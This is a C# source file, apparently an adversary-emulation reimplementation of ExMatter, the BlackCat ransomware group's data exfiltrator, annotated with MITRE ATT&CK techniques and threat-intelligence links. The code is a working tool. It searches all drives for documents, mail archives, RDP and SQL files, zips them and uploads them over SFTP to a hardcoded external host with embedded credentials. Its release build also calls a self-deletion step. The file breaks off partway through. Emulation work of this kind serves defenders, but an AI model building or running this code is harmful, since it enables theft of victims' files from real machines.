using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace ExMatter
{
    internal class ExMatter
    {
        // used for file discovery. restrictions on which files to put in the targetFiles list
        private static readonly int MIN_BYTES = 4096; // minimum file size in bytes
        private static readonly int MAX_BYTES = 67108864; // maximum file size in bytes
        private static readonly string[] GOOD_EXTS = new string[] // file extensions we want to target
        {
            ".bmp",
            ".doc",
            ".docx",
            ".dwg",
            ".ipt",
            ".jpeg",
            ".jpg",
            ".msg",
            ".pdf",
            ".png",
            ".pst",
            ".rdp",
            ".rtf",
            ".sql",
            ".txt",
            ".xls",
            ".xlsx",
            ".zip"
        };
        private static readonly string[] BAD_DIRS = new string[] // directories we want to avoid
        {
            "\\AppData\\Local\\Microsoft",
            "\\AppData\\Local\\Packages",
            "\\AppData\\Roaming\\Microsoft",
            "C:\\$Recycle.Bin",
            "C:\\Documents and Settings",
            "C:\\PerfLogs",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData",
            "C:\\Users\\All Users\\Microsoft",
            "C:\\Windows"
        };
        private static List<FileInfo> targetFiles = new List<FileInfo>(); // store the target files for processing

        // used for connection to the sftp server and testing
        private static readonly string host = @"hide-the-secret-password-inator.net";
        private static readonly string username = "sftpupload";
        private static readonly string password = @"Cardstock-Empirical";
        private static readonly string remoteDirectory = "uploads/" + System.Environment.GetEnvironmentVariable("COMPUTERNAME") + DateTime.Now.ToString("yyyyMMddHHmmss");
        private static readonly SftpClient sftp = new SftpClient(host, username, password);

        // used for zip and log files
        private static readonly string pwd = Directory.GetCurrentDirectory();
        private static readonly string zipOutPath = pwd + "\\archive";
        private static readonly string zipExt = ".zip";
        private static List<FileInfo> zipFiles = new List<FileInfo>();
        private static readonly int MAX_FILES_PER_ZIP = 100;
        private static readonly string logFilePath = pwd + "\\EMlog.txt";
#if DEBUG
        private static readonly bool LOG_ENC = false;
#else
        private static readonly bool LOG_ENC = true;
#endif

        private static readonly bool outputExceptions = true;

        /// <summary>
        /// <c><b>ExMatter</b></c>:
        /// <para><b>About:</b></para>
        ///     Data exfiltrator used by BlackCat.
        ///     <list type="bullet">
        ///     <item><description>Scans this computer for all logical drives.</description></item>
        ///     <item><description>Searches found logical drives for files to exfiltrate.</description></item>
        ///     <item><description>Stages target files in zip files.</description></item>
        ///     <item><description>Exfiltrates zip files over SFTP.</description></item>
        ///     <item><description>Spawns powershell process to destroy this executable.</description></item>
        ///     </list>
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1082: System Information Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1082/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1083: File and Directory Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1083/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1119: Automated Collection
        ///     <see href="https://attack.mitre.org/techniques/T1119/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1005: Data from Local System
        ///     <see href="https://attack.mitre.org/techniques/T1005/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1074.001: Data Staged: Local Data Staging
        ///     <see href="https://attack.mitre.org/techniques/T1074/001/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1560.002: Archive Collected Data: Archive via Library
        ///     <see href="https://attack.mitre.org/techniques/T1560/002/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1048.001: Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
        ///     <see href="https://attack.mitre.org/techniques/T1048/001/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration"/></description></item>
        ///     <item><description><see href="https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/"/></description></item>
        ///     <item><description><see href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack"/></description></item>
        ///     <item><description><see href="https://www.bleepingcomputer.com/news/security/blackcat-ransomware-s-data-exfiltration-tool-gets-an-upgrade/"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     <item><description><see href="https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/"/></description></item>
        ///     </list>
        /// </summary>
        static void Main(string[] args)
        {
            Logger.InitializeLogger(logFilePath, encryptLogs: LOG_ENC);

            // get information of logical drives and put them in array
            DriveInfo[] allDrives = GetDriveInfos();

            // look through logical drives and gather target files
            foreach (DriveInfo d in allDrives)
            {
                FindTargetFiles(d);
            }

            Logger.Info("[+] Completed searching for target files");

#if DEBUG
            // for testing, we only want the testing files
            List<FileInfo> testingFiles = new List<FileInfo>();
            foreach (FileInfo fi in targetFiles)
            {
                // only upload testing files
                if (fi.FullName.Contains("GoodDir") || fi.FullName.Contains("GoodFile"))
                {
                    testingFiles.Add(fi);
                }
            }
            targetFiles = testingFiles;
#endif

            SortTargetFileList();

            if (targetFiles.Count > 0)
            {
                // stage the target files into zips and upload
                ProcessFiles(targetFiles);
                ListFiles();
            }
            else
            {
                Logger.Info("No target files to process.");
            }

#if DEBUG
            // for testing, remove target files from sftp server
            DeleteBulk(zipFiles);
            ListFiles();
#endif

            Cleanup();

#if DEBUG
            System.Environment.Exit(0);
#endif

            Destroy();
        }

        /// <summary>
        /// <c><b>GetDriveInfos</b></c>:
        /// <para><b>About:</b></para>
        ///     Collect information on the logical drives of this computer.
        /// <para><b>Result:</b></para>
        ///     Outputs information to log and populates a list of drives to investigate.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1082: System Information Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1082/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration"/></description></item>
        ///     <item><description><see href="https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/"/></description></item>
        ///     <item><description><see href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     </list>
        /// </summary>
        /// <returns>
        /// An array of <c>DriveInfo</c> containing the logical drives on this computer.
        /// </returns>
        public static DriveInfo[] GetDriveInfos()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            Logger.Info("[+] Outputting drive information: ");

            foreach (DriveInfo d in allDrives)
            {
                Logger.Info($"Drive {d.Name}");
                Logger.Info($"/---------------------------------------------------------\\");
                Logger.Info($"| Drive type                      | {d.DriveType,21} |");
                if (d.IsReady == true)
                {
                    Logger.Info($"| Volume label                    | {d.VolumeLabel,21} |");
                    Logger.Info($"| File system                     | {d.DriveFormat,21} |");
                    Logger.Info($"| Available space to current user | {d.AvailableFreeSpace,15} bytes |");
                    Logger.Info($"| Total available space           | {d.TotalFreeSpace,15} bytes |");
                    Logger.Info($"| Total size of drive             | {d.TotalSize,15} bytes |");
                }
                Logger.Info($"\\---------------------------------------------------------/");
                Logger.Info("");
            }

            Logger.Info("[+] Completed outputting drive information");

            return allDrives;
        }

        /// <summary>
        /// <c><b>FindTargetFiles</b></c>:
        /// <para><b>About:</b></para>
        ///     Look through a logical drive for target files.
        ///     Kickes off <c>FindTargetFilesRecurse</c> to recursively parse the drive.
        /// <para><b>Result:</b></para>
        ///     Populates the <paramref name="targetFiles"/> List with target files (indirectly).
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1083: File and Directory Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1083/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1119: Automated Collection
        ///     <see href="https://attack.mitre.org/techniques/T1119/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1005: Data from Local System
        ///     <see href="https://attack.mitre.org/techniques/T1005/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration"/></description></item>
        ///     <item><description><see href="https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/"/></description></item>
        ///     <item><description><see href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="d">The <c>DriveInfo</c> drive to parse.</param>
        public static void FindTargetFiles(DriveInfo d)
        {
            DirectoryInfo diTop = new DirectoryInfo(d.Name);
            Logger.Info($"[*] Searching for files in drive {d.Name}");
            FindTargetFilesRecurse(diTop);

            Logger.Info("[+] Target files located:");
            Logger.Info("File Name\t| File Size\t| Last Write Time");

            foreach (FileInfo fi in targetFiles)
            {
#if DEBUG
                // only output testing files
                if (fi.FullName.Contains("GoodDir") || fi.FullName.Contains("GoodFile") || fi.FullName.Contains("BadFile")) // TODO: remove for release
                {
                    Logger.Info($"{fi.FullName}\t| {fi.Length:N0}\t| {File.GetLastWriteTime(fi.FullName)}");
                }
#else
                Logger.Info($"{fi.FullName}\t| {fi.Length:N0}\t| {File.GetLastWriteTime(fi.FullName)}");
#endif
            }

            Logger.Info($"[+] Completed searching for target files in drive {d.Name}");
        }

        /// <summary>
        /// <c><b>FindTargetFilesRecurse</b></c>:
        /// <para><b>About:</b></para>
        ///     Recursively parse a directory <paramref name="diTop"/> for target files.
        /// <para><b>Result:</b></para>
        ///     Populates the <paramref name="targetFiles"/> List with target files.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1083: File and Directory Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1083/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1119: Automated Collection
        ///     <see href="https://attack.mitre.org/techniques/T1119/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1005: Data from Local System
        ///     <see href="https://attack.mitre.org/techniques/T1005/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration"/></description></item>
        ///     <item><description><see href="https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/"/></description></item>
        ///     <item><description><see href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="diTop">The <c>DirectoryInfo</c> directory to parse.</param>
        public static void FindTargetFilesRecurse(DirectoryInfo diTop)
        {
            try
            {
                foreach (FileInfo fi in diTop.EnumerateFiles())
                {
                    try
                    {
                        if (IsTargetFile(fi))
                        {
                            targetFiles.Add(fi);
                            Logger.Info($"[+] Found file {fi.FullName}");
                        }
                    }
                    catch (Exception e)
                    {
                        if (outputExceptions)
                        {
                            Logger.Error($"[!] Caught exception {e.GetType().Name} for parsing {fi.FullName}: {e.Message}");
                            Logger.Warn($"\t[*] Skipping {fi.FullName}. Reason: encountered exception.");
                        }
                    }
                }
                foreach (DirectoryInfo di in diTop.EnumerateDirectories("*"))
                {
                    try
                    {
                        var badDir = IsBadDir(di);
                        if (!badDir.Item1)
                        {
                            FindTargetFilesRecurse(di);
                        }
                        else
                        {
                            Logger.Info($"\t[*] Skipping {di.FullName}. Reason: {badDir.Item2}");
                        }
                    }
                    catch (Exception e)
                    {
                        if (outputExceptions)
                        {
                            Logger.Error($"[!] Caught exception {e.GetType().Name} for parsing directory {di.FullName}: {e.Message}");
                            Logger.Warn($"\t[*] Skipping {di.FullName}. encountered exception.");
                        }
                    }
                }
            }
            catch (Exception e)
            {
                if (outputExceptions)
                {
                    Logger.Error($"[!] Caught exception {e.GetType().Name} for parsing directory {diTop.FullName}: {e.Message}");
                }
            }
        }

        /// <summary>
        /// <c><b>IsTargetFile</b></c>:
        /// <para><b>About:</b></para>
        ///     Check if <paramref name="fi"/> is a file we want to exfiltrate.
        ///     <list type="bullet">
        ///     <item><description><paramref name="fi"/> must be smaller than <c>MIN_BYTES</c>.</description></item>
        ///     <item><description><paramref name="fi"/> must be larger than <c>MAX_BYTES</c>.</description></item>
        ///     <item><description><paramref name="fi"/>'s extension must be in <c>GOOD_EXTS</c>.</description></item>
        ///     <item><description><paramref name="fi"/> must not have the <c>FileAttributes.System</c> attribute.</description></item>
        ///     <item><description><paramref name="fi"/> must not have the <c>FileAttributes.Temporary</c> attribute.</description></item>
        ///     </list>
        /// <para><b>Result:</b></para>
        ///     Returns true if we want to exfiltrate, false if not.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1083: File and Directory Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1083/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1119: Automated Collection
        ///     <see href="https://attack.mitre.org/techniques/T1119/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1005: Data from Local System
        ///     <see href="https://attack.mitre.org/techniques/T1005/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack"/></description></item>
        ///     <item><description><see href="https://www.bleepingcomputer.com/news/security/blackcat-ransomware-s-data-exfiltration-tool-gets-an-upgrade/"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="fi">The <c>FileInfo</c> file to check.</param>
        /// <returns>
        /// <list type="bullet">
        /// <item><description>true - <paramref name="fi"/> is a valid target.</description></item>
        /// <item><description>false - <paramref name="fi"/> is not a valid target.</description></item>
        /// </list>
        /// </returns>
        public static bool IsTargetFile(FileInfo fi)
        {
            return fi.Length > MIN_BYTES && // file isn't too small
                   fi.Length < MAX_BYTES && // file isn't too large
                   GOOD_EXTS.Contains(fi.Extension.ToLower()) && // file has good extension
                   !((fi.Attributes & FileAttributes.System) == FileAttributes.System) && // file isn't a system file
                   !((fi.Attributes & FileAttributes.Temporary) == FileAttributes.Temporary); // file isn't a temporary file
        }

        /// <summary>
        /// <c><b>IsBadDir</b></c>:
        /// <para><b>About:</b></para>
        ///     <para>Check if <paramref name="dir"/> is a directory we want to investigate.</para>
        ///     <list type="bullet">
        ///     <item><description><paramref name="dir"/> must not be in <c>BAD_DIRS</c>.</description></item>
        ///     <item><description><paramref name="dir"/> must not have the <c>FileAttributes.ReparsePoint</c> attribute.</description></item>
        ///     </list>
        /// <para><b>Result:</b></para>
        ///     Returns true if we should not investigate, false if we should.
        ///     If true, returns the reason why not.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1083: File and Directory Discovery
        ///     <see href="https://attack.mitre.org/techniques/T1083/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1119: Automated Collection
        ///     <see href="https://attack.mitre.org/techniques/T1119/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1005: Data from Local System
        ///     <see href="https://attack.mitre.org/techniques/T1005/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack"/></description></item>
        ///     <item><description><see href="https://www.bleepingcomputer.com/news/security/blackcat-ransomware-s-data-exfiltration-tool-gets-an-upgrade/"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="dir">The <c>DirectoryInfo</c> directory to check.</param>
        /// <returns>
        /// <b>bool:</b>
        /// <list type="bullet">
        /// <item><description>true - we should not investigate this directory.</description></item>
        /// <item><description>false - we should investigate this directory.</description></item>
        /// </list>
        /// <b>string:</b>
        ///     <para>if <c>bool==true</c>, populated with the reason why not.</para>
        /// </returns>
        public static (bool, string) IsBadDir(DirectoryInfo dir)
        {
            string dirStr = dir.FullName;
            (bool, string) retVal = (false, "");

            // if the directory is a symlink or junction, skip it
            // these are skipped to avoid duplicates/errors and if it is a good dir it will get looked at eventually
            if ((dir.Attributes & FileAttributes.ReparsePoint) == FileAttributes.ReparsePoint)
            {
                return (true, "dir is symlink or junction.");
            }

            // loop through the directories we do not want to look in (badDir)
            foreach (string badDir in BAD_DIRS)
            {
                int found = dirStr.IndexOf(badDir);

                // check if dir contains badDir
                if (found != -1) // value of -1 denotes not found
                {
                    /* 
                     * put any contents after the bad dir into a string
                     * example:
                     * C:\Users\rshovan\AppData\Local\Microsoft is a bad dir, but
                     * C:\Users\rshovan\AppData\Local\MicrosoftEdge is not
                     * the former will have an str of "" and the latter will have an str of "Edge"
                     * so, if str != "", then we want to look in it
                    */
                    string str = dirStr.Substring((found + badDir.Length));
                    if (str != "")
                    {
                        continue; // skip over the below check
                    }

                    // cover case where dir is exactly badDir
                    // and the few AppData bad dirs
                    if (dirStr.Contains(badDir))
                    {
                        retVal = (true, "in bad dir list.");
                        break;
                    }
                }
            }
            return retVal;
        }

        /// <summary>
        /// <c><b>SortTargetFileList</b></c>:
        /// <para><b>About:</b></para>
        ///     Sort the list of target files to prioritize files that were more recently written to.
        /// <para><b>Result:</b></para>
        ///     The <c>targetFiles</c> List is sorted.
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration"/></description></item>
        ///     </list>
        /// </summary>
        public static void SortTargetFileList()
        {
            Logger.Info("[*] Sorting target files by Last Write Time.");

            targetFiles.Sort(CompareLastWriteTime); // sort by LastWriteTime attribute
            targetFiles = Enumerable.Reverse(targetFiles).ToList(); // put newest files on top of list

            Logger.Info("File Name\t| File Size\t| Last Write Time");
            foreach (FileInfo fi in targetFiles) // output new list of files
            {
                Logger.Info($"{fi.FullName}\t| {fi.Length:N0}\t| {File.GetLastWriteTime(fi.FullName)}");
            }

            Logger.Info("[+] Completed sorting target files by Last Write Time.");
        }

        /// <summary>
        /// <c><b>CompareLastWriteTime</b></c>:
        /// <para><b>About:</b></para>
        ///     Sorting function used in <c>SortTargetFileList</c> to sort by LastWriteTime.
        ///     Compare <paramref name="f1"/> and <paramref name="f2"/>'s LastWriteTime.
        /// <para><b>Result:</b></para>
        ///     Indicate which file was last written to.
        /// </summary>
        /// <param name="f1">The first <c>FileInfo</c> file to compare.</param>
        /// <param name="f2">The second <c>FileInfo</c> file to compare.</param>
        /// <returns>
        /// <para>A signed number indicating the relative values of <paramref name="f1"/> and <paramref name="f2"/>.</para>
        /// <para>Less than zero - <paramref name="f1"/> is earlier than <paramref name="f2"/>.</para>
        /// <para>Zero - <paramref name="f1"/> is the same as <paramref name="f2"/>.</para>
        /// <para>Greater than zero - <paramref name="f1"/> is later than <paramref name="f2"/>.</para>
        /// </returns>
        public static int CompareLastWriteTime(FileInfo f1, FileInfo f2)
        {
            return DateTime.Compare(File.GetLastWriteTime(f1.FullName), File.GetLastWriteTime(f2.FullName));
        }

        /// <summary>
        /// <c><b>ProcessFiles</b></c>:
        /// <para><b>About:</b></para>
        ///     Package the files in <paramref name="files"/> into zips and send them to the SFTP server.
        ///     The destination directory name is the local machine hostname plus the current timestamp in YYYYMMDDHHmmss format.
        ///     Zips will contain up to <paramref name="MAX_FILES_PER_ZIP"/> files.
        /// <para><b>Result:</b></para>
        ///     Files in <paramref name="files"/> are exfiltrated.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1074.001: Data Staged: Local Data Staging
        ///     <see href="https://attack.mitre.org/techniques/T1074/001/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1560.002: Archive Collected Data: Archive via Library
        ///     <see href="https://attack.mitre.org/techniques/T1560/002/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1048.001: Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
        ///     <see href="https://attack.mitre.org/techniques/T1048/001/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     <item><description><see href="https://www.bleepingcomputer.com/news/security/blackcat-ransomware-s-data-exfiltration-tool-gets-an-upgrade/"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="files">The <c>FileInfo</c> List of files to exfiltrate.</param>
        public static void ProcessFiles(List<FileInfo> files)
        {
            // Create destination directory
            try
            {
                sftp.Connect();
                sftp.CreateDirectory(remoteDirectory);
            }
            catch (Exception e)
            {
                sftp.Disconnect();
                Logger.Error($"[!] Caught exception {e.GetType().Name} for creating destination directory {remoteDirectory} on SFTP server: {e.Message}");
                return;
            }
            Logger.Info($"Created upload directory {remoteDirectory} on SFTP server");
            
            int currentZipNum = 0;

            Logger.Info($"[*] Beginning processing {files.Count} target files for upload");

            try
            {
                for (int i = 0; i < files.Count; i += MAX_FILES_PER_ZIP)
                {
                    string zipName = zipOutPath + $"{currentZipNum}" + zipExt;

                    if (files.Count > i + MAX_FILES_PER_ZIP)
                    {
                        Logger.Info($"[*] Zipping {MAX_FILES_PER_ZIP} files");
                        ZipFiles(files.GetRange(i, MAX_FILES_PER_ZIP), zipName);
                    }
                    else
                    {
                        Logger.Info($"[*] Zipping {files.Count - i} files");
                        ZipFiles(files.GetRange(i, files.Count - i), zipName);
                    }

                    UploadFile(zipName);
                    zipFiles.Add(new FileInfo(zipName));
                    currentZipNum++;
                }

            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught exception {e.GetType().Name} for when zipping and uploading files: {e.Message}");
                return;
            }
            finally
            {
                sftp.Disconnect();
            }
            
            Logger.Info("[*] Completed processing target files");
        }

        /// <summary>
        /// <c><b>ZipFiles</b></c>:
        /// <para><b>About:</b></para>
        ///     Zip files in <paramref name="files"/> into the zip <paramref name="zip"/>.
        /// <para><b>Result:</b></para>
        ///     Files in <paramref name="files"/> are zipped into <paramref name="zip"/>.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1074.001: Data Staged: Local Data Staging
        ///     <see href="https://attack.mitre.org/techniques/T1074/001/"/>
        ///     </description></item>
        ///     <item><description>
        ///     T1560.002: Archive Collected Data: Archive via Library
        ///     <see href="https://attack.mitre.org/techniques/T1560/002/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="files">The <c>FileInfo</c> List of files to zip.</param>
        /// <param name="zip">The path of the zip to create.</param>
        public static void ZipFiles(List<FileInfo> files, string zip)
        {
            Logger.Info($"[*] Staging {files.Count} target files in zip {zip}");

            try
            {
                // create the zip file
                ZipArchive archive = ZipFile.Open(zip, ZipArchiveMode.Create);

                // loop through the target files
                foreach (FileInfo file in files)
                {
                    try
                    {
                        // add the target file to the zip
                        archive.CreateEntryFromFile(file.FullName, file.Name);
                    }
                    catch (Exception e)
                    {
                        if (outputExceptions)
                        {
                            Logger.Error($"[!] Caught {e.GetType().Name} exception in {file.FullName}: {e.Message}");
                        }
                    }
                }

                archive.Dispose();

                Logger.Info($"[+] Completed creating zip {zip}");
            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught {e.GetType().Name} exception creating zip file: {e.Message}");
            }
        }

        // list the files on the sftp server
        // used for testing
        public static void ListFiles()
        {
            try
            {
                sftp.Connect();

                Logger.Info($"[*] Listing files in sftp server {host}:{remoteDirectory}");

                var files = sftp.ListDirectory(remoteDirectory);
                foreach (var file in files)
                {
                    Logger.Info($"\t{file.Name}");
                }

                sftp.Disconnect();
            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught exception {e.GetType().Name} for listing sftp files: {e.Message}");
            }
        }

        /// <summary>
        /// <c><b>UploadFile</b></c>:
        /// <para><b>About:</b></para>
        ///     Uploads the file <paramref name="filePath"/> to the sftp server <paramref name="host"/>:<paramref name="remoteDirectory"/>.
        /// <para><b>Result:</b></para>
        ///     The file <paramref name="filePath"/> has been uploaded.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1048.001: Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
        ///     <see href="https://attack.mitre.org/techniques/T1048/001/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href="https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool"/></description></item>
        ///     <item><description><see href="https://www.bleepingcomputer.com/news/security/blackcat-ransomware-s-data-exfiltration-tool-gets-an-upgrade/"/></description></item>
        ///     <item><description><see href="https://stairwell.com/news/threat-research-report-exmatter-future-of-data-extortion/"/></description></item>
        ///     <item><description><see href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps"/></description></item>
        ///     </list>
        /// </summary>
        /// <param name="filePath">The path to the file to upload</param>
        public static void UploadFile(string filePath)
        {
            FileStream fs = new FileStream(filePath, FileMode.Open);
            bool err = false;

            Logger.Info($"[*] Uploading file {filePath} to sftp server {host}:{remoteDirectory}");

            try
            {
                sftp.BufferSize = 1024;
                sftp.UploadFile(fs, remoteDirectory + "/" + Path.GetFileName(filePath));
            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught exception {e.GetType().Name} for uploading file {filePath} to sftp: {e.Message}");
                err = true;
            }
            finally
            {
                fs.Close();
            }

            if (!err)
            {
                Logger.Info($"[+] Successfully uploaded file {filePath} to sftp server {host}:{remoteDirectory}");
            }
        }

#if DEBUG
        // remove a file from the sftp server
        // used for testing
        public static void DeleteFile(string filePath)
        {
            Logger.Info($"[*] Removing file {filePath} from sftp server {host}:{remoteDirectory}");

            try
            {
                sftp.Connect();
                sftp.DeleteFile(filePath);
                sftp.Disconnect();
            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught exception {e.GetType().Name} for deleting sftp file {filePath}: {e.Message}");
            }
        }

        // remove multiple files from the sftp server
        // used for testing
        public static void DeleteBulk(List<FileInfo> files)
        {
            try
            {
                sftp.Connect();

                foreach (FileInfo file in files)
                {
                    Logger.Info($"[*] Removing file {file.Name} from sftp server {host}:{remoteDirectory}");
                    try
                    {
                        sftp.DeleteFile(file.Name);
                    }
                    catch (Exception e)
                    {
                        Logger.Error($"[!] Caught exception {e.GetType().Name} for deleting sftp file {file.Name}: {e.Message}");
                    }
                }

                sftp.Disconnect();
            }
            catch (Exception e)
            {
                Logger.Error($"[!] Caught exception {e.GetType().Name} for deleting sftp files: {e.Message}");
            }
        }
#endif

        /// <summary>
        /// <c><b></b></c>:
        /// <para><b>About:</b></para>
        ///     Ensure we are disconnected from the sftp server. Remove the zip files created for staging.
        /// <para><b>Result:</b></para>
        ///     Created zip files are removed from disk.
        /// <para><b>MITRE ATT&amp;CK Techniques:</b></para>
        ///     <list type="bullet">
        ///     <item><description>
        ///     T1070.004: Indicator Removal: File Deletion
        ///     <see href="https://attack.mitre.org/techniques/T1070/004/"/>
        ///     </description></item>
        ///     </list>
        /// <para><b>CTI:</b></para>
        ///     <list type="number">
        ///     <item><description><see href=""/></description></item>
        ///     </list>
        /// </summary>
        public static void Cleanup()
        {
